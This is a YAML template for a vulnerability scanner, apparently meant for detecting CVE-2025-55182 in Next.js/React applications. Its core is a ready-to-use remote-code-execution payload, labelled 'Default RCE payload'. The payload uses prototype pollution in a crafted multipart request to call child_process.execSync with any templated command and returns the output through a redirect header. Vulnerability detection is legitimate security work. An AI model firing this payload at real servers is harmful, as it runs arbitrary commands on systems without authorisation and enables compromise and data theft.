version: 1.0.0
name: CVE-2025-55182
author: Specter Team
description: Detects the presence of the CVE-2025-55182 vulnerability in Next
severity: high

framework:
  - Next.js

languages:
  - Javascript/Typescript

Technologies:
  - React

headers:
  Next-Action: "x"
  X-Nextjs-Request-Id: "{{ .request_id }}"
  X-Nextjs-Html-Request-Id: "{{ .nextjs_html }}"
  Content-Type: "multipart/form-data; boundary={{ .boundary }}"
  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

timeout: 15
method: "POST"

payloads:
  - name: "default"
    description: "Default RCE payload"
    command: "{{ .command }}"
    json_template: |
      {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('{{ .escaped_command }}').toString().trim().replace(/\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}

matchers:
  - type: "header"
    name: "X-Action-Redirect"

output:
  success:
